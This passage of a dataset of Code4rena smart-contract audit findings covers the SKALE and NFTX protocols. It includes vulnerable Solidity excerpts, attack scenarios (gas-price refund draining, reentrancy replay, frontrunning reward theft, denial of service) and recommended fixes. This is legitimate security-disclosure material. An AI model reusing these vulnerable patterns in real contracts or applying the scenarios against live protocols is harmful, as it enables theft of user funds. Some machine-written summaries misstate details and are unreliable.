      "content": "_Submitted by kirk-baird, also found by leastwood_\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/CommunityPool.sol#L82-L112>\n\n<https://github.com/skalenetwork/ima-c4-audit/blob/main/contracts/mainnet/MessageProxyForMainnet.sol#L235-L250>\n\n### Impact\n\nThe function `refundGasByUser()` can be exploited by the message sender to drain nodes and SChain owners of their balances when processing incoming messages.\n\nWhen a node collates a set of exits from an SChain to Ethereum, they are submitted on-chain via `MessageProxyForMainnet.sol`.  For each message to a registered contract the user is required to pay for the refund via `CommunityPool.refundGasByUser()`.\n\nThe issue occurs in `CommunityPool.refundGasByUser()`  as the amount to be refunded is calculated as `uint amount = tx.gasprice * gas;`, where `gas` is the gas used by the message. Since `tx.gasprice` is set by the node and there is no upper bounds on the price. Since EIP1559 the gas price is `BaseFee + Tip` and although `Base` is predetermined `Tip` is any arbitrary non-zero integer.\n\nThe attack is for a node to set an excessively high `tx.gasprice` which will be refunded out of the balance of the user who initiated the outgoing transaction or if that user has insufficient balance then from the SChain owner.  Since the node submitting the transaction is refunded for their gas they do not lose from setting a higher gas price.\n\nThe impact of the attack is that the user requesting the exit and/or the SChain owner may have their ETH balances depleted to refund the submitter. The impact is worsened as if the user has insufficient balance a message will be sent to the SChain preventing them from making further exits until they have sufficient balance.\n\nNote a similar issue may be seen in `IWallets.refundGasBySchain()` depending on how the gas calculations are performed (they are not in scope but the `TestWallet` also uses `tx.gasprice` in the same manner).\n\n### Proof of Concept\n\nProcessing incoming messages in `MessageProxyForMainnet.sol`\n\n```solidity\n        for (uint256 i = 0; i < messages.length; i++) {\n            gasTotal = gasleft();\n            if (isContractRegistered(bytes32(0), messages[i].destinationContract)) {\n                address receiver = _getGasPayer(fromSchainHash, messages[i], startingCounter + i);\n                _callReceiverContract(fromSchainHash, messages[i], startingCounter + i);\n                notReimbursedGas += communityPool.refundGasByUser(\n                    fromSchainHash,\n                    payable(msg.sender),\n                    receiver,\n                    gasTotal - gasleft() + additionalGasPerMessage\n                );\n            } else {\n                _callReceiverContract(fromSchainHash, messages[i], startingCounter + i);\n                notReimbursedGas += gasTotal - gasleft() + additionalGasPerMessage;\n            }\n        }\n```\n\nRefunding gas in `CommunityPool.sol`\n\n```solidity\n    function refundGasByUser(\n        bytes32 schainHash,\n        address payable node,\n        address user,\n        uint gas\n    )\n        external\n        override\n        onlyMessageProxy\n        returns (uint)\n    {\n        require(node != address(0), \"Node address must be set\");\n        if (!activeUsers[user][schainHash]) {\n            return gas;\n        }\n        uint amount = tx.gasprice * gas;\n        if (amount > _userWallets[user][schainHash]) {\n            amount = _userWallets[user][schainHash];\n        }\n        _userWallets[user][schainHash] = _userWallets[user][schainHash] - amount;\n        if (!_balanceIsSufficient(schainHash, user, 0)) {\n            activeUsers[user][schainHash] = false;\n            messageProxy.postOutgoingMessage(\n                schainHash,\n                schainLinks[schainHash],\n                Messages.encodeLockUserMessage(user)\n            );\n        }\n        node.sendValue(amount);\n        return (tx.gasprice * gas - amount) / tx.gasprice;\n    }\n```\n\n### Recommended Mitigation Steps\n\nOne solution to avoid excessive over refunding of gas fees is to use a gas price oracle rather than `tx.gasprice`.\n\nAn alternate solution is to set a maximum gas price and have some incentives for the node submitting at a gas price below the maximum.\n\n**[cstrangedk (SKALE) resolved](https://github.com/code-423n4/2022-02-skale-findings/issues/28#issuecomment-1176670089):**\n > Resolved via https://github.com/skalenetwork/IMA/pull/1165/\n***\n\n \n",
      "summary": "\nA bug has been identified in the function `refundGasByUser()` of the `CommunityPool.sol` contract. This function is used when processing incoming messages in `MessageProxyForMainnet.sol`. The issue is that the amount to be refunded is calculated as `uint amount = tx.gasprice * gas;`, where `gas` is the gas used by the message and `tx.gasprice` is set by the node. As `tx.gasprice` is an arbitrary non-zero integer, this could lead to an excessively high `tx.gasprice` being refunded out of the balance of the user who initiated the outgoing transaction or the SChain owner. This could lead to a depletion of ETH balances, and the SChain owner may be prevented from making further exits until they have sufficient balance. \n\nTwo recommended mitigation steps are given. One solution is to use a gas price oracle rather than `tx.gasprice`. An alternate solution is to set a maximum gas price and have some incentives for the node submitting at a gas price below the maximum.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/28",
      "tags": [],
      "finders": [
        "leastwood",
        "kirk-baird"
      ]
    },
    {
      "id": "1598",
      "title": "[H-01] Reentrancy in `MessageProxyForSchain` leads to replay attacks",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe `postIncomingMessages` function calls `_callReceiverContract(fromChainHash, messages[i], startingCounter + 1)` which gives control to a contract that is potentially attacker controlled *before* updating the `incomingMessageCounter`.\n\n```solidity\nfor (uint256 i = 0; i < messages.length; i++) {\n    // @audit re-entrant, can submit same postIncomingMessages again\n    _callReceiverContract(fromChainHash, messages[i], startingCounter + 1);\n}\nconnectedChains[fromChainHash].incomingMessageCounter += messages.length;\n```\n\nThe attacker can re-enter into the `postIncomingMessages` function and submit the same messages again, creating a replay attack.\nNote that the `startingCounter` is the way how messages are prevented from replay attacks here, there are no further nonces.\n\n### Proof of Concept\n\nAttacker can submit two cross-chain messages to be executed:\n\n1.  Transfer 1000 USDC\n2.  A call to their attacker-controlled contract, could be masked as a token contract that allows re-entrance on `transfer`.\n\nSome node submits the `postIncomingMessages(params)` transaction, transfers 1000 USDC, then calls the attackers contract, who can themself call `postIncomingMessages(params)` again, receive 1000 USDC a second time, and stop the recursion.\n\n### Recommended Mitigation Steps\n\nAdd a `messageInProgressLocker` modifier to `postIncomingMessages` as was done in `MessageProxyForMainnet`.\n\n**cstrangedk (SKALE) resolved:**\n\nResolved via https://github.com/skalenetwork/IMA/pull/1054\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `postIncomingMessages` function of the `MessageProxyForSchain.sol` contract. This function calls `_callReceiverContract(fromChainHash, messages[i], startingCounter + 1)` which gives control to a contract that is potentially attacker-controlled before updating the `incomingMessageCounter`. This allows an attacker to re-enter the `postIncomingMessages` function and submit the same messages again, creating a replay attack. \n\nA proof of concept (POC) is provided to demonstrate the vulnerability. In the POC, the attacker can submit two cross-chain messages to be executed: one to transfer 1000 USDC and one to call their attacker-controlled contract. Some node submits the `postIncomingMessages(params)` transaction, transfers 1000 USDC, then calls the attackers contract, who can then call `postIncomingMessages(params)` again, receive 1000 USDC a second time, and stop the recursion.\n\nThe recommended mitigation step is to add a `messageInProgressLocker` modifier to `postIncomingMessages` as was done in `MessageProxyForMainnet`.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "SKALE",
      "source_link": "https://code4rena.com/reports/2022-02-skale",
      "github_link": "https://github.com/code-423n4/2022-02-skale-findings/issues/24",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "42417",
      "title": "[M-13] Dishonest Stakers Can Siphon Rewards From `xToken` Holders Through The `deposit` Function In `NFTXInventoryStaking`",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n`xTokens` is intended to be a representation of staked vault tokens. As the protocol's vaults accrue fees from users, these fees are intended to be distributed to users in an inconsistent fashion. `NFTXInventoryStaking` is one of the ways users can stake vault tokens. Deposits are timelocked for `2` seconds by default, essentially rendering flash loan attacks redundant. However, it is more than likely that the same user could withdraw their `xToken` deposit in the next block (assuming an average block time of just over 13 seconds).\n\nHence, if a well-funded attacker sees a transaction to distribute rewards to `xToken` holders, they could deposit a large sum of vault tokens and receive a majority share of the rewards before withdrawing their tokens in the following block. Additionally, the attacker can force distribute rewards in `NFTXSimpleFeeDistributor` as there is no access control on the `distribute` function.\n\nThis issue allows users to siphon user's rewards from the protocol, intended to be distributed to honest vault token stakers.\n\n#### Proof of Concept\n\nConsider the following exploit scenario:\n\n*   Currently there are 1000 `shares` and 1000 `base tokens` in the `XTokenUpgradeable` contract.\n*   Honest actor, Alice, calls `distribute` in `NFTXSimpleFeeDistributor` which attempts to send 200 `base tokens` as rewards for `xToken` holders accrued via protocol usage.\n*   Bob sees a transaction to reward `xToken` holders and frontruns this transaction by staking vault tokens, minting 1000 `shares` and 1000 `base tokens`.\n*   Rewards are distributed such that `XTokenUpgradeable` has 2000 `shares` and 2200 `base tokens`.\n*   Bob unstakes his tokens and exits the pool, redeeming his 1000 `shares` for 1100 `base tokens`.\n*   As a result, Bob was able to siphon off 100 `base tokens` without having to stake their tokens for the same time period that Alice had staked her tokens for.\n*   This unfair distribution can be abused again and again to essentially reward dishonest actors over honest staking participants such as Alice.\n\n#### Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n#### Recommended Mitigation Steps\n\nConsider adding a delay to users token deposits into the `XTokenUpgradeable` such that miners cannot feasibly censor a transaction for the specified time interval and users cannot frontrun a transaction to distribute rewards. The interval should be chosen such that enough time is provided for the transaction to be included in a block, given poor network conditions.\n\nI.e. If the chosen interval is 20 blocks. Miners must be able to censor the rewards distribution for 20 blocks. This is unlikely as there would need to be sufficient miner collusion for value to be extracted from the protocol. Additionally, an interval of 20 blocks means that stakers who attempt to enter the pool upon seeing the transaction in the mempool won't be rewarded for such behaviour.\n\nIt is also essential that the `distribute` function in `NFTXSimpleFeeDistributor` is restricted to a given role, ensuring malicious users cannot control at what point rewards are distributed.\n\nAlternatively, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as [reference](https://v4.docs.pooltogether.com/protocol/concepts/time-weight-average-balance/). This would ensure the fairest distribution of rewards to stakers, however, there are additional gas costs associated with this implementation. Hence, unless the protocol intends to be used primarily on L2 protocols, this solution should be avoided.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/57#issuecomment-1007912676):**\n > While this attack is possible, without available flash liquidity, this attack vector requires a lot of (possibly difficult to acquire) capital to execute. Disagreeing with severity and acknowledging.\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/57#issuecomment-1064495218):**\n > I agree with the sponsor that the risk of this happening is almost zero. Yes it's technically possible but the funds lost are going to be minimal and the attacker will almost definitely pay more in slippage and gas fees than they make. That said, this is a direct attack which results in a loss of user funds so making it less than medium risk seems disingenuous.\n\n\n\n***\n\n",
      "summary": "\nThe report describes a potential issue with the `xTokens` protocol, which is used to represent staked vault tokens. The problem is that an attacker with a large amount of funds could exploit the system and unfairly receive a majority of the rewards intended for honest stakers. This is possible because the system allows for quick deposits and withdrawals of tokens. The report suggests implementing a delay for withdrawals and restricting access to the function responsible for distributing rewards. Another solution is to use a Time-Weighted-Average-Balance implementation, but this may result in higher gas costs. The severity of the issue was debated, with some believing it to be unlikely to occur due to the high capital required for the attack. However, it was still acknowledged as a potential risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/57",
      "tags": [],
      "finders": []
    },
    {
      "id": "42416",
      "title": "[M-12] `buyAndSwap1155WETH` Does Not Work As Intended",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nThe `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314>\n\n```solidity\nfunction buyAndSwap1155WETH(\n  uint256 vaultId, \n  uint256[] memory idsIn, \n  uint256[] memory amounts, \n  uint256[] memory specificIds, \n  uint256 maxWethIn, \n  address[] calldata path,\n  address to\n) public payable nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  uint256 count;\n  for (uint256 i = 0; i < idsIn.length; i++) {\n      uint256 amount = amounts[i];\n      require(amount > 0, \"Transferring < 1\");\n      count += amount;\n  }\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (count - specificIds.length)\n  );\n  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n  _swap1155(vaultId, idsIn, amounts, specificIds, to);\n\n  emit Swap(count, swapAmounts[0], to);\n\n  // Return extras.\n  uint256 remaining = WETH.balanceOf(address(this));\n  WETH.transfer(to, remaining);\n}\n```\n\n#### Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n#### Recommended Mitigation Steps\n\nConsider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).\n\n    uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/45)**\n\n\n\n***\n\n",
      "summary": "\nThe `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` is not working properly. It is supposed to allow users to buy and swap `ERC1155` tokens in one transaction, but it requires both `WETH` and native `ETH` amounts instead of just `WETH`. This means that the function will not work unless the user provides both types of tokens in equivalent amounts. A solution has been suggested to update the code in the function, which has been confirmed and resolved by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/45",
      "tags": [],
      "finders": []
    },
    {
      "id": "42415",
      "title": "[M-10] NFTXSimpleFeeDistributor._sendForReceiver doesn't return success if receiver is not a contract",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\nDouble spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones.\nAs `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.\n\n#### Proof of Concept\n\n`distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`:\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67>\n\n`_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed.\nWhen `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done:\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168>\n\nThis way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice:\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64>\n\n#### Recommended Mitigation Steps\n\nNow:\n\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n  ...\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n\nTo be:\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n  ...\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n    return true;\n  }\n}\n```\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/105)**\n\n\n\n***\n\n",
      "summary": "\nThe report highlights a bug in the NFTXSimpleFeeDistributor contract where double spending of fees can occur. This happens because the function `_sendForReceiver` does not return a success status when transferring fees to a non-contract address. As a result, the fee amount is sent twice, once to the current receiver and again to the next receiver in the list. This leads to double payments for some receivers and missed payments for others. The report recommends a simple fix to return a success status after the transfer is completed, which will prevent the double spending issue. The bug has been confirmed and resolved by the NFTX team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/105",
      "tags": [],
      "finders": []
    },
    {
      "id": "42414",
      "title": "[M-06] `xToken` Approvals Allow Spenders To Spend More Tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nThe `approve` function has not been overridden and therefore uses `xToken` shares instead of the equivalent rebalanced amount, i.e. the underlying vault token amount.\n\n#### Proof of Concept\n\nThe approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing as rewards continue to be distributed to the `XTokenUpgradeable` contract.\n\nMany contracts also use the same amount for the `approve` call as for the amount they want to have transferred in a subsequent `transferFrom` call, and in this case, they approve an amount that is too large (as the approved `shares` amount yields a higher rebalanced amount).\n\n#### Recommended Mitigation Steps\n\nThe `_allowances` field should track the rebalanced amounts (i.e. the equivalent vault token amount) such that the approval value does not grow.\n\nThe `transferFrom` needs to be overridden and approvals should then be subtracted by the transferred vault token `amount`, not `shares`.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/58#issuecomment-1003191456):**\n > Not sure if I agree with this severity. If I approve for xTokens, I'm using xTokens, not the underlying token.\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/58#issuecomment-1064497035):**\n > This is a medium risk, not high. External assumptions (malicious contracts) are requires for any attack regarding the approval being too high. \n\n\n\n***\n\n",
      "summary": "\nThe `approve` function in the `XTokenUpgradeable` contract is not working properly. This means that the approved spender can spend more tokens than intended, as the approved amount keeps growing due to rewards being distributed. This can be a problem for contracts that use the same amount for the `approve` and `transferFrom` calls. The recommended solution is to update the `_allowances` field to track the rebalanced amounts and to override the `transferFrom` function to subtract the transferred amount from the approvals. The severity of this issue was initially considered high, but was later reduced to medium as it requires external assumptions for an attack to occur.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/58",
      "tags": [],
      "finders": []
    },
    {
      "id": "42413",
      "title": "[M-04] NFTXStakingZap and NFTXMarketplaceZap's transferFromERC721 transfer Cryptokitties to the wrong address",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n`transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`.\nIt transfers to `address(this)` instead when ERC721 is Cryptokitties.\nAs there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).\n\n#### Proof of Concept\n\nNFTXStakingZap:\ntransferFromERC721\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416>\n\nNFTXMarketplaceZap:\ntransferFromERC721\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556>\n\nBoth functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.\n\n#### Recommended Mitigation Steps\n\nFix the address:\n\nNow:\n\n```solidity\n  // Cryptokitties.\n  data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId);\n```\n\nTo be:\n```solidity\n  // Cryptokitties.\n  data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, to, tokenId);\n```\n\n**[0xKiwi (NFTX) confirmed, but disagreed with medium severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/185#issuecomment-1003211591):**\n > This was intentional, as I thought it was needed for the contract to require custody, but it should work fine to send directly to the vault.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/185)**\n\n\n***\n\n",
      "summary": "\nThe report is about a bug in the transferFromERC721 function, which is used to transfer non-fungible tokens (NFTs) from one address to another. The function is supposed to transfer the NFT from the sender to the specified address, but when used with Cryptokitties, it instead transfers the NFT to the contract address. This can cause problems with the NFT accounting and result in the NFT being lost in the contract. The bug has been identified in two user-facing functions, NFTXStakingZap and NFTXMarketplaceZap, which are used for buying, selling, and adding liquidity to NFTs. The recommended solution is to fix the address in the code to ensure that the NFT is transferred to the correct address. The project team has confirmed the bug, but disagrees with the severity and has resolved the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/185",
      "tags": [],
      "finders": []
    },
    {
      "id": "42412",
      "title": "[M-03] `NFTXMarketplaceZap.sol#buyAnd***()` should return unused weth/eth back to `msg.sender` instead of `to`",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L226-L249>\n\n```solidity\nfunction buyAndSwap721WETH(\n  uint256 vaultId, \n  uint256[] memory idsIn, \n  uint256[] memory specificIds, \n  uint256 maxWethIn, \n  address[] calldata path,\n  address to\n) public nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (idsIn.length - specificIds.length)\n  );\n  uint256[] memory amounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n  _swap721(vaultId, idsIn, specificIds, to);\n\n  emit Swap(idsIn.length, amounts[0], to);\n\n  // Return extras.\n  uint256 remaining = WETH.balanceOf(address(this));\n  WETH.transfer(to, remaining);\n}\n```\n\nFor example:\n\nIf Alice calls `buyAndSwap721WETH()` to buy some ERC721 and send to Bob, for slippage control, Alice put `1000 ETH` as `maxWethIn`, the actual cost should be lower.\n\nLet's say the actual cost is `900 ETH`.\n\nExpected Results: Alice spend only for the amount of the actual cost (`900 ETH`).\n\nActual Results: Alice spent `1000 ETH`.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with medium severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/161#issuecomment-1003214046):**\n > I think the idea in this is that if a contract is buying for someone else, the zap handles the refund instead of the contract originating the purchase.\n> But this is a valid concern, thank you\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/161#issuecomment-1064555316):**\n > This does result in a loss of funds if the user sends the wrong amount. I agree with the warden's severity rating.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `buyAndSwap721WETH` in a contract called NFTXMarketplaceZap. The function is supposed to buy ERC721 tokens and send them to a specified address. However, there is a problem with the function where it does not accurately calculate the cost of the tokens being bought. This means that if a user sets a maximum amount of ETH to spend, the actual cost may be lower but the function will still spend the full maximum amount. This results in a loss of funds for the user. The severity of the bug has been rated as medium and the developers have acknowledged the issue but have not yet fixed it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/161",
      "tags": [],
      "finders": []
    },
    {
      "id": "1233",
      "title": "[M-17] transfer return value is ignored",
      "impact": "MEDIUM",
      "content": "_Submitted by robee, also found by 0x1f8b, cmichel, csanuragjain, defsec, hyh, leastwood, sirhashalot, and WatchPug_\n\nNeed to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/transferFrom method doesnâ€™t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must\n\n1.  Check the transfer return value\n\nAnother popular possibility is to add a whiteList.\nThose are the appearances (solidity file, line number, actual line):\n\n```solidity\nNFTXStakingZap.sol, 401, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken); \nNFTXStakingZap.sol, 474, IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this))); \nPalmNFTXStakingZap.sol, 190, pairedToken.transferFrom(msg.sender, address(this), wethIn); \nPalmNFTXStakingZap.sol, 195, pairedToken.transfer(to, wethIn-amountEth); \nPalmNFTXStakingZap.sol, 219, pairedToken.transferFrom(msg.sender, address(this), wethIn); \nPalmNFTXStakingZap.sol, 224, pairedToken.transfer(to, wethIn-amountEth); \nPalmNFTXStakingZap.sol, 316, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken); \nXTokenUpgradeable.sol, 54, baseToken.transfer(who, what); \nNFTXFlashSwipe.sol, 51, IERC20Upgradeable(vault).transferFrom(msg.sender, address(this), mintFee + targetRedeemFee);\n```\n\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/40#issuecomment-1003186753):**\n > Disagreeing with the severity, but will make sure I stick to safeTransferFrom, thank you.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/40)**\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/40#issuecomment-1064472797):**\n > This is medium risk, not high. Loss of funds requires external factors.\n\n\n\n***\n\n",
      "summary": "\nThis bug report was submitted by user robee. There is a vulnerability in the code that needs to be addressed. The transfer/transferFrom method is not returning anything when dealing with popular tokens such as USDT. The return value of the transfer must be checked, as some tokens return false instead of reverting. To prevent this, a white list should be added. The appearances of the vulnerability are listed in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/40",
      "tags": [],
      "finders": [
        "csanuragjain",
        "sirhashalot",
        "cmichel",
        "robee",
        "leastwood",
        "WatchPug",
        "0x1f8b",
        "hyh",
        "defsec"
      ]
    },
    {
      "id": "1232",
      "title": "[M-16] Malicious receiver can make distribute function denial of service",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz_\n\nIn the NFTXSimpleFeeDistributor.sol contract, the distribute function calls the \\_sendForReceiver function to distribute the fee\n\n```solidity\nfunction distribute(uint256 vaultId) external override virtual nonReentrant {\n  require(nftxVaultFactory != address(0));\n  address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);\n\n  uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n\n  if (distributionPaused || allocTotal == 0) {\n    IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);\n    return;\n  }\n\n  uint256 length = feeReceivers.length;\n  uint256 leftover;\n  for (uint256 i = 0; i <length; i++) {\n    FeeReceiver memory _feeReceiver = feeReceivers[i];\n    uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);\n    uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n    amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;\n    bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);\n    if (!complete) {\n      leftover = amountToSend;\n    } else {\n      leftover = 0;\n    }\n  }\n```\n\nIn the \\_sendForReceiver function, when the \\_receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in DOS.\n\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);\n    // If the receive is not properly processed, send it to the treasury instead.\n      \n    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);\n    (bool success,) = address(_receiver.receiver).call(payload);\n\n    // If the allowance has not been spent, it means we can pass it forward to next.\n    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L166>\n\n#### Recommended Mitigation Steps\n\nThe contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.\n\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/69#issuecomment-1003192680):**\n > This is a permissioned entity, but this is a valid concern. User funds not at risk and the dao can remove the malciious receiver (if it ever gets there in the first place). Good thinking. 